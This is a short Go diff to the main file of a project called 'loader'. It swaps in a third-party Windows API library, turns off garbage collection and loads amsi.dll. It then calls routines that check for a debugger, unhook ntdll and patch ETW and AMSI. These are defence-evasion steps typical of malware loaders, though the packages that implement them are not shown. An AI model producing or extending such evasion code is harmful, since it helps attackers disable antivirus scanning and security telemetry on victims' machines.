@@ -11,15 +11,15 @@ import (
 	"loader/pkg/wrappers"
 	"loader/pkg/ekko"
 	"loader/pkg/patch"
-	"syscall"
+	api "github.com/carved4/go-wincall"
 	"strings"
+	"runtime/debug"
 )
 
 func main() {
-
+	debug.SetGCPercent(-1)
 	patch.CheckDebug()
-	syscall.MustLoadDLL("amsi.dll")
-	syscall.NewLazyDLL("amsi.dll")
+	api.LoadLibraryW("amsi.dll")
 	winapi.UnhookNtdll()
 	patch.ETW()
 	patch.AMSI()
